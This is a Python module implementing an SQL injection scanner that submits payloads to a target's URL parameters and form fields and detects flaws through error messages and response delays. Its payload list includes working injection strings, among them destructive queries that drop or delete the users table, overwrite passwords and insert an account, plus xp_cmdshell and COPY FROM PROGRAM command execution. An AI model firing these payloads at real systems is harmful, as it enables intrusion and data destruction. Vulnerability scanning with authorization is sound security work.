"""
SQL Injection scanner module.

Tests for SQL injection vulnerabilities by sending payloads and analyzing responses.
"""

import re
import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs

class SQLInjectionScanner:
    """Scanner for detecting SQL Injection vulnerabilities."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the SQL Injection scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # SQL injection payloads to test - expanded with more aggressive techniques
        self.payloads = [
            # Basic authentication bypass
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "1' OR '1'='1",
            "admin' --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1--",
            "')) OR (('1'='1--",
            
            # Error-based SQL injection
            "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT user()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --",
            "' AND (SELECT 2*IF((SELECT * FROM (SELECT CONCAT(0x3a,(SELECT user()),0x3a,0x3a)) s), 1, 0))-- -",
            "AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)))",
            "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x3a,user(),0x3a)) USING utf8)))",
            
            # Time-based blind SQL injection
            "' AND (SELECT * FROM (SELECT(SLEEP(1)))a) --",
            "' AND SLEEP(1) --",
            "' WAITFOR DELAY '0:0:3' --",
            "1' WAITFOR DELAY '0:0:3' --",
            "'; WAITFOR DELAY '0:0:3' --",
            "1); WAITFOR DELAY '0:0:3' --",
            "'; SELECT pg_sleep(3) --",
            "'; SELECT SLEEP(3) --",
            
            # Union-based SQL injection
            "' UNION SELECT null,null,null,null,null--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,2,3,4,@@version--",
            "' UNION SELECT username,password,3,4,5 FROM users--",
            "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x3a,0x3a,(SELECT table_name FROM information_schema.tables LIMIT 1),0x3a,0x3a)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "'; DELETE FROM users--",
            
            # Database specific payloads
            # MySQL
            "' OR 1=1 -- -",
            "' OR 1=1 ORDER BY 10-- -",
            "' PROCEDURE ANALYSE()-- -",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))-- -",
            
            # SQL Server
            "' OR 1=1 -- ",
            "'; EXEC xp_cmdshell('net user')-- ",
            "'; EXEC master..xp_cmdshell 'net user'-- ",
            
            # PostgreSQL
            "' OR 1=1; -- ",
            "'; SELECT pg_sleep(5)-- ",
            "'; CREATE TEMP TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; -- ",
            
            # Oracle
            "' OR 1=1 -- ",
            "' UNION SELECT banner FROM v$version-- ",
            "' UNION SELECT DISTINCT table_name FROM all_tables-- ",
            
            # SQLite
            "' OR 1=1 -- ",
            "' UNION SELECT sqlite_version()-- ",
            "' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table'-- "
        ]
        
        # Error patterns indicating successful SQL injection
        self.sql_error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Microsoft SQL Server",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"SQLServerException",
            r"Unclosed quotation mark after the character string",
            r"SQLITE_ERROR",
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"DB2 SQL error",
            r"JDBC.*DB2",
            r"CLI Driver.*DB2"
        ]
        
        # Compile regex patterns
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.sql_error_patterns]
    
    def _extract_forms(self, url):
        """
        Extract all forms from a URL.
        
        Args:
            url (str): The URL to extract forms from
            
        Returns:
            list: List of dictionaries containing form details
        """
        try:
            response = requests.get(url, headers=self.headers, timeout=self.timeout)
            if response.status_code != 200:
                return []
                
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_details = {}
                action = form.get('action', '')
                form_details['action'] = urljoin(url, action) if action else url
                form_details['method'] = form.get('method', 'get').lower()
                form_details['inputs'] = []
                
                for input_tag in form.find_all(['input', 'textarea']):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name')
                    input_value = input_tag.get('value', '')
                    
                    if input_name:  # Only include inputs with names
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name,
                            'value': input_value
                        })
                
                forms.append(form_details)
            
            return forms
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error extracting forms from {url}: {str(e)}")
            return []
    
    def _extract_parameters(self, url):
        """
        Extract GET parameters from a URL.
        
        Args:
            url (str): The URL to extract parameters from
            
        Returns:
            dict: Dictionary of parameters and values
        """
        parsed_url = urlparse(url)
        return parse_qs(parsed_url.query)
    
    def _scan_get_parameters(self, url):
        """
        Test URL GET parameters for SQL injection vulnerabilities.
        Uses aggressive error-based and time-based detection techniques.
        
        Args:
            url (str): The URL to test
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        parameters = self._extract_parameters(url)
        if not parameters:
            return vulnerabilities
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing GET parameters in URL: {url}")
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # First check: standard error-based detection
        for param_name, param_values in parameters.items():
            for payload in self.payloads:
                test_url = f"{base_url}?{param_name}={payload}"
                
                # Add other parameters back
                for p_name, p_values in parameters.items():
                    if p_name != param_name:
                        test_url += f"&{p_name}={p_values[0]}"
                
                try:
                    if self.verbose and self.logger:
                        self.logger.info(f"Testing payload on parameter '{param_name}': {payload}")
                    
                    response = requests.get(
                        test_url, 
                        headers=self.headers, 
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                    
                    # Check for SQL error patterns in response
                    if self._check_sql_errors(response.text):
                        detail = f"Parameter '{param_name}' is vulnerable to SQL injection using payload: {payload}"
                        vulnerability = {
                            'type': 'SQL Injection',
                            'url': url,
                            'method': 'GET',
                            'parameter': param_name,
                            'payload': payload,
                            'details': detail,
                            'severity': 'High',
                            'evidence': 'Error-based detection'
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"SQL Injection found: {detail}")
                        
                        # No need to test more payloads for this parameter
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing GET parameter '{param_name}': {str(e)}")
        
        # Second check: Enhanced time-based blind detection with our advanced method
        # Only perform if no error-based vulnerabilities found
        if not any(v['parameter'] == param_name for v in vulnerabilities for param_name in parameters.keys()):
            for param_name, param_values in parameters.items():
                if self.verbose and self.logger:
                    self.logger.info(f"Testing parameter '{param_name}' for time-based blind SQL injection")
                
                # Use our advanced time-based detection method
                is_vulnerable, payload, time_diff = self._detect_time_based_sqli(url, param_name=param_name)
                
                if is_vulnerable:
                    detail = f"Parameter '{param_name}' is vulnerable to time-based blind SQL injection using payload: {payload}"
                    vulnerability = {
                        'type': 'SQL Injection',
                        'url': url,
                        'method': 'GET',
                        'parameter': param_name,
                        'payload': payload,
                        'details': detail,
                        'timing': f"Response delayed by {time_diff:.2f} seconds",
                        'severity': 'High',
                        'recommendation': "Parameterize all database queries and implement proper input validation"
                    }
                    vulnerabilities.append(vulnerability)
                    
                    if self.logger:
                        self.logger.warning(f"Time-based SQL injection found: {detail}")
                    
                    # No need to test more parameters once we've found a vulnerability
                    break
        # This is more aggressive as it uses actual timing differences to detect vulnerabilities
        if not any(v['parameter'] == param_name for v in vulnerabilities for param_name in parameters.keys()):
            # Time-based payloads (shorter delays for better UX while maintaining detection)
            time_based_payloads = [
                # MySQL time-based
                "' AND IF(1=1, SLEEP(2), 0) --",
                "' AND (SELECT SLEEP(2)) --",
                "1' AND (SELECT SLEEP(2)) AND '1'='1",
                
                # PostgreSQL time-based
                "'; SELECT pg_sleep(2) --",
                "1'; SELECT pg_sleep(2) --",
                
                # SQL Server time-based
                "'; WAITFOR DELAY '0:0:2' --",
                "1'; WAITFOR DELAY '0:0:2' --",
                
                # Oracle time-based (using heavy queries)
                "' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) --",
                "1' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) --"
            ]
            
            for param_name, param_values in parameters.items():
                for payload in time_based_payloads:
                    test_url = f"{base_url}?{param_name}={payload}"
                    
                    # Add other parameters back
                    for p_name, p_values in parameters.items():
                        if p_name != param_name:
                            test_url += f"&{p_name}={p_values[0]}"
                    
                    try:
                        if self.verbose and self.logger:
                            self.logger.info(f"Testing time-based payload on parameter '{param_name}': {payload}")
                        
                        # First request: normal
                        start_time = time.time()
                        response = requests.get(
                            test_url,
                            headers=self.headers,
                            timeout=max(self.timeout, 10),  # Ensure timeout is long enough
                            allow_redirects=False
                        )
                        end_time = time.time()
                        time_diff = end_time - start_time
                        
                        # If the response took significantly longer, it's likely vulnerable
                        # Threshold of 1.5 seconds accounts for network jitter while detecting real delays
                        if time_diff > 1.5:
                            # Perform a control test with a non-time-based payload to confirm
                            control_url = f"{base_url}?{param_name}=1"
                            # Add other parameters back
                            for p_name, p_values in parameters.items():
                                if p_name != param_name:
                                    control_url += f"&{p_name}={p_values[0]}"
                                    
                            start_time = time.time()
                            control_response = requests.get(
                                control_url,
                                headers=self.headers,
                                timeout=self.timeout,
                                allow_redirects=False
                            )
                            end_time = time.time()
                            control_time_diff = end_time - start_time
                            
                            # If the time difference is significant compared to control request
                            # (at least 1.5x longer and at least 1.5 second absolute difference)
                            if time_diff > (control_time_diff * 1.5) and (time_diff - control_time_diff) > 1.5:
                                detail = f"Parameter '{param_name}' is vulnerable to blind SQL injection (time-based) using payload: {payload}"
                                vulnerability = {
                                    'type': 'SQL Injection (Blind)',
                                    'url': url,
                                    'method': 'GET',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'details': detail,
                                    'severity': 'High',
                                    'evidence': f'Time-based detection (payload: {time_diff:.2f}s, control: {control_time_diff:.2f}s)'
                                }
                                vulnerabilities.append(vulnerability)
                                
                                if self.logger:
                                    self.logger.warning(f"Blind SQL Injection found: {detail}")
                                
                                # No need to test more payloads for this parameter
                                break
                    
                    except requests.exceptions.Timeout:
                        # Timeout might indicate a successful time-based injection
                        # But we need to confirm it's not just a slow server
                        try:
                            # Control request
                            control_url = f"{base_url}?{param_name}=1"
                            control_response = requests.get(
                                control_url,
                                headers=self.headers,
                                timeout=self.timeout,
                                allow_redirects=False
                            )
                            
                            # If control request succeeds but payload request times out,
                            # this strongly suggests a successful time-based injection
                            detail = f"Parameter '{param_name}' is vulnerable to blind SQL injection (time-based) using payload: {payload}"
                            vulnerability = {
                                'type': 'SQL Injection (Blind)',
                                'url': url,
                                'method': 'GET',
                                'parameter': param_name,
                                'payload': payload,
                                'details': detail,
                                'severity': 'High',
                                'evidence': 'Time-based detection (request timeout)'
                            }
                            vulnerabilities.append(vulnerability)
                            
                            if self.logger:
                                self.logger.warning(f"Blind SQL Injection found: {detail}")
                            
                            # No need to test more payloads for this parameter
                            break
                        except:
                            # If control request also fails, the server might just be slow
                            pass
                    except Exception as e:
                        if self.logger:
                            self.logger.error(f"Error testing time-based payload on parameter '{param_name}': {str(e)}")
        
        return vulnerabilities
    
    def _scan_form(self, form_details, url):
        """
        Test a form for SQL injection vulnerabilities.
        Uses aggressive techniques including error-based and time-based detection.
        
        Args:
            form_details (dict): Form details including inputs
            url (str): The URL containing the form
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        if not form_details['inputs']:
            return vulnerabilities
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing form on URL: {url}, Action: {form_details['action']}")
        
        # Phase 1: Error-based detection
        for payload in self.payloads:
            # We'll test each input field one by one
            for input_field in form_details['inputs']:
                # Skip non-text inputs (checkboxes, submit buttons, etc.)
                if input_field['type'] not in ['text', 'search', 'email', 'url', 'password', 'hidden', '']:
                    continue
                
                # Prepare data for the form submission
                data = {}
                for input_tag in form_details['inputs']:
                    if input_tag['name'] == input_field['name']:
                        data[input_tag['name']] = payload
                    elif input_tag['type'] != 'submit':  # Handle other non-submit inputs
                        data[input_tag['name']] = input_tag['value']
                
                if self.verbose and self.logger:
                    self.logger.info(f"Testing form field '{input_field['name']}' with payload: {payload}")
                
                try:
                    if form_details['method'] == 'post':
                        response = requests.post(
                            form_details['action'],
                            data=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    else:  # GET
                        response = requests.get(
                            form_details['action'],
                            params=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    
                    # Check for SQL error patterns in response
                    if self._check_sql_errors(response.text):
                        detail = f"Form field '{input_field['name']}' is vulnerable to SQL injection using payload: {payload}"
                        vulnerability = {
                            'type': 'SQL Injection',
                            'url': url,
                            'method': form_details['method'].upper(),
                            'form_action': form_details['action'],
                            'parameter': input_field['name'],
                            'payload': payload,
                            'details': detail,
                            'severity': 'High',
                            'evidence': 'Error-based detection'
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"SQL Injection found: {detail}")
                        
                        # No need to test more payloads for this field
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing form field '{input_field['name']}': {str(e)}")
        
        # Phase 2: Enhanced time-based blind injection detection with our advanced method
        # Only test fields that haven't been detected as vulnerable yet
        vulnerable_fields = {v['parameter'] for v in vulnerabilities}
        
        for input_field in form_details['inputs']:
            if input_field['name'] in vulnerable_fields or input_field['type'] not in ['text', 'search', 'email', 'url', 'password', 'hidden', '']:
                continue
                
            if self.verbose and self.logger:
                self.logger.info(f"Testing form field '{input_field['name']}' for time-based blind SQL injection")
            
            # Use our advanced time-based detection method
            is_vulnerable, payload, time_diff = self._detect_time_based_sqli(
                form_details['action'], 
                form_details=form_details, 
                input_field=input_field
            )
            
            if is_vulnerable:
                detail = f"Form field '{input_field['name']}' is vulnerable to time-based blind SQL injection using payload: {payload}"
                vulnerability = {
                    'type': 'SQL Injection (Blind)',
                    'url': url,
                    'method': form_details['method'].upper(),
                    'form_action': form_details['action'],
                    'parameter': input_field['name'],
                    'payload': payload,
                    'details': detail,
                    'timing': f"Response delayed by {time_diff:.2f} seconds",
                    'severity': 'High',
                    'recommendation': "Parameterize all database queries and implement proper input validation"
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning(f"Time-based SQL injection found: {detail}")
                
                # No need to test more fields once we've found a vulnerability
                break
                
            # Fall back to original time-based method if needed
            time_based_payloads = [
                # MySQL time-based
                "' AND IF(1=1, SLEEP(2), 0) --",
                "' AND (SELECT SLEEP(2)) --",
                "1' AND (SELECT SLEEP(2)) AND '1'='1",
                
                # PostgreSQL time-based
                "'; SELECT pg_sleep(2) --",
                "1'; SELECT pg_sleep(2) --",
                
                # SQL Server time-based
                "'; WAITFOR DELAY '0:0:2' --",
                "1'; WAITFOR DELAY '0:0:2' --",
                
                # Oracle time-based (using heavy queries)
                "' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) --",
                "1' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) --"
            ]
            
            for payload in time_based_payloads:
                # Prepare data for the form submission
                data = {}
                for input_tag in form_details['inputs']:
                    if input_tag['name'] == input_field['name']:
                        data[input_tag['name']] = payload
                    elif input_tag['type'] != 'submit':
                        data[input_tag['name']] = input_tag['value']
                
                if self.verbose and self.logger:
                    self.logger.info(f"Testing time-based payload on form field '{input_field['name']}': {payload}")
                
                try:
                    # First request with payload
                    start_time = time.time()
                    
                    if form_details['method'] == 'post':
                        response = requests.post(
                            form_details['action'],
                            data=data,
                            headers=self.headers,
                            timeout=max(self.timeout, 10),  # Ensure timeout is long enough
                            allow_redirects=False
                        )
                    else:  # GET
                        response = requests.get(
                            form_details['action'],
                            params=data,
                            headers=self.headers,
                            timeout=max(self.timeout, 10),
                            allow_redirects=False
                        )
                        
                    end_time = time.time()
                    time_diff = end_time - start_time
                    
                    # If the response took significantly longer, it's likely vulnerable
                    # Threshold of 1.5 seconds accounts for network jitter while detecting real delays
                    if time_diff > 1.5:
                        # Perform a control test with a non-time-based payload to confirm
                        control_data = {}
                        for input_tag in form_details['inputs']:
                            if input_tag['name'] == input_field['name']:
                                control_data[input_tag['name']] = "test123"  # A safe value
                            elif input_tag['type'] != 'submit':
                                control_data[input_tag['name']] = input_tag['value']
                                    
                        start_time = time.time()
                        if form_details['method'] == 'post':
                            control_response = requests.post(
                                form_details['action'],
                                data=control_data,
                                headers=self.headers,
                                timeout=self.timeout,
                                allow_redirects=False
                            )
                        else:  # GET
                            control_response = requests.get(
                                form_details['action'],
                                params=control_data,
                                headers=self.headers,
                                timeout=self.timeout,
                                allow_redirects=False
                            )
                        end_time = time.time()
                        control_time_diff = end_time - start_time
                        
                        # If the time difference is significant compared to control request
                        # (at least 1.5x longer and at least 1.5 second absolute difference)
                        if time_diff > (control_time_diff * 1.5) and (time_diff - control_time_diff) > 1.5:
                            detail = f"Form field '{input_field['name']}' is vulnerable to blind SQL injection (time-based) using payload: {payload}"
                            vulnerability = {
                                'type': 'SQL Injection (Blind)',
                                'url': url,
                                'method': form_details['method'].upper(),
                                'form_action': form_details['action'],
                                'parameter': input_field['name'],
                                'payload': payload,
                                'details': detail,
                                'severity': 'High',
                                'evidence': f'Time-based detection (payload: {time_diff:.2f}s, control: {control_time_diff:.2f}s)'
                            }
                            vulnerabilities.append(vulnerability)
                            
                            if self.logger:
                                self.logger.warning(f"Blind SQL Injection found: {detail}")
                            
                            # No need to test more payloads for this field
                            break
                
                except requests.exceptions.Timeout:
                    # Timeout might indicate a successful time-based injection
                    # But we need to confirm it's not just a slow server
                    try:
                        # Control request
                        control_data = {}
                        for input_tag in form_details['inputs']:
                            if input_tag['name'] == input_field['name']:
                                control_data[input_tag['name']] = "test123"  # A safe value
                            elif input_tag['type'] != 'submit':
                                control_data[input_tag['name']] = input_tag['value']
                                
                        if form_details['method'] == 'post':
                            control_response = requests.post(
                                form_details['action'],
                                data=control_data,
                                headers=self.headers,
                                timeout=self.timeout,
                                allow_redirects=False
                            )
                        else:  # GET
                            control_response = requests.get(
                                form_details['action'],
                                params=control_data,
                                headers=self.headers,
                                timeout=self.timeout,
                                allow_redirects=False
                            )
                        
                        # If control request succeeds but payload request times out,
                        # this strongly suggests a successful time-based injection
                        detail = f"Form field '{input_field['name']}' is vulnerable to blind SQL injection (time-based) using payload: {payload}"
                        vulnerability = {
                            'type': 'SQL Injection (Blind)',
                            'url': url,
                            'method': form_details['method'].upper(),
                            'form_action': form_details['action'],
                            'parameter': input_field['name'],
                            'payload': payload,
                            'details': detail,
                            'severity': 'High',
                            'evidence': 'Time-based detection (request timeout)'
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"Blind SQL Injection found: {detail}")
                        
                        # No need to test more payloads for this field
                        break
                    except:
                        # If control request also fails, the server might just be slow
                        pass
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing time-based payload on form field '{input_field['name']}': {str(e)}")
        
        return vulnerabilities
    
    def _detect_time_based_sqli(self, url_or_form, param_name=None, form_details=None, input_field=None):
        """
        Advanced detection for time-based blind SQL injection vulnerabilities.
        This method attempts multiple sophisticated payloads and analyzes response times
        to identify potential blind SQL injection points.
        
        Args:
            url_or_form (str): The URL to test or form action URL
            param_name (str, optional): The GET parameter name to test
            form_details (dict, optional): Form details if testing a form
            input_field (dict, optional): Input field details if testing a form field
            
        Returns:
            tuple: (is_vulnerable, payload, time_diff) or (False, None, 0) if not vulnerable
        """
        # Enhanced time-based payloads with more sophisticated techniques
        time_based_payloads = [
            # MySQL time-based with conditional logic for more reliable detection
            "' AND IF(1=1, SLEEP(2), 0) --",
            "' AND (SELECT SLEEP(2)) --",
            "1' AND (SELECT SLEEP(2)) AND '1'='1",
            "' OR (SELECT 1 FROM (SELECT SLEEP(2))A) --",
            "') OR (SELECT 1 FROM (SELECT SLEEP(2))A) --",
            "' AND (SELECT * FROM (SELECT SLEEP(2))A) --",
            
            # PostgreSQL time-based with different syntax variations
            "'; SELECT pg_sleep(2) --",
            "1'; SELECT pg_sleep(2) --",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END --",
            "1'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END --",
            
            # SQL Server time-based with more variations and conditional logic
            "'; WAITFOR DELAY '0:0:2' --",
            "1'; WAITFOR DELAY '0:0:2' --",
            "'; IF 1=1 WAITFOR DELAY '0:0:2' --",
            "'; IF 1=1 BEGIN WAITFOR DELAY '0:0:2' END --",
            
            # Oracle time-based using various techniques
            "' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) --",
            "1' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) --",
            "' AND (SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('A'),2) ELSE NULL END FROM dual) IS NOT NULL --",
            
            # SQLite time-based using heavy queries
            "' AND randomblob(100000000) --",
            "' AND (WITH RECURSIVE t(n) AS (VALUES(1) UNION ALL SELECT n+1 FROM t WHERE n<1000000) SELECT 1 FROM t LIMIT 1) --",
            
            # Universal heavy query techniques
            "' AND (SELECT count(*) FROM generate_series(1,10000000)) --",
            "' UNION SELECT 1,pg_sleep(2),null,null,null --",
            "1' OR 1=(SELECT 1 FROM PG_SLEEP(2)) --",
            "' OR EXISTS(SELECT SLEEP(2)) --"
        ]
        
        # Control payloads that shouldn't cause delays
        control_payloads = ["1", "'", "1'", "' --", "1' --"]
        
        # For GET parameters
        if param_name and not form_details:
            parsed_url = urlparse(url_or_form)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            parameters = self._extract_parameters(url_or_form)
            
            # First get baseline response times with control payloads
            baseline_times = []
            for control in control_payloads:
                control_url = f"{base_url}?{param_name}={control}"
                # Add other parameters back
                for p_name, p_values in parameters.items():
                    if p_name != param_name:
                        control_url += f"&{p_name}={p_values[0]}"
                
                try:
                    start_time = time.time()
                    requests.get(
                        control_url,
                        headers=self.headers,
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                    baseline_times.append(time.time() - start_time)
                except:
                    continue
            
            # Calculate average baseline response time
            avg_baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 0.5
            
            # Now test each time-based payload
            for payload in time_based_payloads:
                test_url = f"{base_url}?{param_name}={payload}"
                # Add other parameters back
                for p_name, p_values in parameters.items():
                    if p_name != param_name:
                        test_url += f"&{p_name}={p_values[0]}"
                
                try:
                    start_time = time.time()
                    requests.get(
                        test_url,
                        headers=self.headers,
                        timeout=max(self.timeout, 10),  # Ensure timeout is long enough
                        allow_redirects=False
                    )
                    time_diff = time.time() - start_time
                    
                    # Advanced heuristic: if response is significantly longer than baseline (3x or at least 1.5 sec)
                    if time_diff > max(avg_baseline * 3, 1.5):
                        # Perform a second request to confirm and reduce false positives
                        start_time = time.time()
                        requests.get(
                            test_url,
                            headers=self.headers,
                            timeout=max(self.timeout, 10),
                            allow_redirects=False
                        )
                        second_time_diff = time.time() - start_time
                        
                        # If both requests show significant delay, it's likely vulnerable
                        if second_time_diff > max(avg_baseline * 2, 1.0):
                            return True, payload, time_diff
                except:
                    continue
        
        # For form fields
        elif form_details and input_field:
            # First get baseline response times with control payloads
            baseline_times = []
            for control in control_payloads:
                data = {}
                for input_tag in form_details['inputs']:
                    if input_tag['name'] == input_field['name']:
                        data[input_tag['name']] = control
                    elif input_tag['type'] != 'submit':
                        data[input_tag['name']] = input_tag['value']
                
                try:
                    start_time = time.time()
                    if form_details['method'] == 'post':
                        requests.post(
                            form_details['action'],
                            data=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    else:  # GET
                        requests.get(
                            form_details['action'],
                            params=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    baseline_times.append(time.time() - start_time)
                except:
                    continue
            
            # Calculate average baseline response time
            avg_baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 0.5
            
            # Now test each time-based payload
            for payload in time_based_payloads:
                data = {}
                for input_tag in form_details['inputs']:
                    if input_tag['name'] == input_field['name']:
                        data[input_tag['name']] = payload
                    elif input_tag['type'] != 'submit':
                        data[input_tag['name']] = input_tag['value']
                
                try:
                    start_time = time.time()
                    if form_details['method'] == 'post':
                        requests.post(
                            form_details['action'],
                            data=data,
                            headers=self.headers,
                            timeout=max(self.timeout, 10),
                            allow_redirects=False
                        )
                    else:  # GET
                        requests.get(
                            form_details['action'],
                            params=data,
                            headers=self.headers,
                            timeout=max(self.timeout, 10),
                            allow_redirects=False
                        )
                    time_diff = time.time() - start_time
                    
                    # Advanced heuristic: if response is significantly longer than baseline (3x or at least 1.5 sec)
                    if time_diff > max(avg_baseline * 3, 1.5):
                        # Perform a second request to confirm and reduce false positives
                        start_time = time.time()
                        if form_details['method'] == 'post':
                            requests.post(
                                form_details['action'],
                                data=data,
                                headers=self.headers,
                                timeout=max(self.timeout, 10),
                                allow_redirects=False
                            )
                        else:  # GET
                            requests.get(
                                form_details['action'],
                                params=data,
                                headers=self.headers,
                                timeout=max(self.timeout, 10),
                                allow_redirects=False
                            )
                        second_time_diff = time.time() - start_time
                        
                        # If both requests show significant delay, it's likely vulnerable
                        if second_time_diff > max(avg_baseline * 2, 1.0):
                            return True, payload, time_diff
                except:
                    continue
        
        return False, None, 0
        
    def _check_sql_errors(self, response_content):
        """
        Check if the response contains SQL error messages.
        Uses aggressive pattern matching to identify even subtle error indications.
        
        Args:
            response_content (str): The response content to check
            
        Returns:
            bool: True if SQL error patterns are found, False otherwise
        """
        # Standard error pattern check
        for pattern in self.compiled_patterns:
            if pattern.search(response_content):
                return True
        
        # More aggressive checks for subtle error indicators
        subtle_indicators = [
            # Database version or environment disclosures
            r"mysql_fetch_array\(",
            r"mysqli_fetch_array\(",
            r"pg_fetch_row\(",
            r"sqlite3_",
            r"SQL Server.*Driver",
            r"PDOStatement",
            
            # Functions that might be exposed in stack traces
            r"execute_query\(",
            r"executeQuery\(",
            r"mysql_query\(",
            r"mysqli_query\(",
            r"db_query\(",
            r"SQLQuery",
            
            # Typical error message fragments that are more generic
            r"database error",
            r"DB Error",
            r"SQL Error",
            r"query.*failed",
            r"failure.*query",
            r"unexpected.*in.*SQL",
            r"unexpected.*in.*database",
            r"command.*not.*properly ended",
            r"syntax.*near",
            
            # Internal structure disclosures
            r"on (line|column) [0-9]+",
            r"in query expression",
            r"error.*line.*[0-9]+",
            r"SQL state",
            
            # Type mismatch errors
            r"conversion failed",
            r"cannot convert",
            r"incompatible.*types",
            
            # Table/column references
            r"table.*does not exist",
            r"column.*does not exist",
            r"unknown column",
            r"field.*not.*found"
        ]
        
        # Extended check for more subtle error patterns
        for indicator in subtle_indicators:
            if re.search(indicator, response_content, re.IGNORECASE):
                return True
                
        # Look for exposed SQL keywords in error context
        sql_keywords_in_errors = [
            r"(error|exception|warning).*\b(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\b",
            r"(error|exception|warning).*\b(UNION|JOIN|TABLE|DATABASE)\b",
            r"\b(SELECT|INSERT|UPDATE|DELETE).*\b(error|exception|warning)\b"
        ]
        
        for keyword_pattern in sql_keywords_in_errors:
            if re.search(keyword_pattern, response_content, re.IGNORECASE):
                return True
        
        return False
    
    def scan(self):
        """
        Start the SQL injection vulnerability scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting SQL injection scan on {self.target_url}")
        
        # Test GET parameters in the main URL
        vulnerabilities.extend(self._scan_get_parameters(self.target_url))
        
        # Extract and test forms
        forms = self._extract_forms(self.target_url)
        for form in forms:
            vulnerabilities.extend(self._scan_form(form, self.target_url))
        
        # If depth > 1, we could crawl for more links and forms
        # (simplified implementation for brevity)
        
        if self.logger:
            self.logger.info(f"SQL injection scan completed. Found {len(vulnerabilities)} vulnerabilities.")
        
        return vulnerabilities
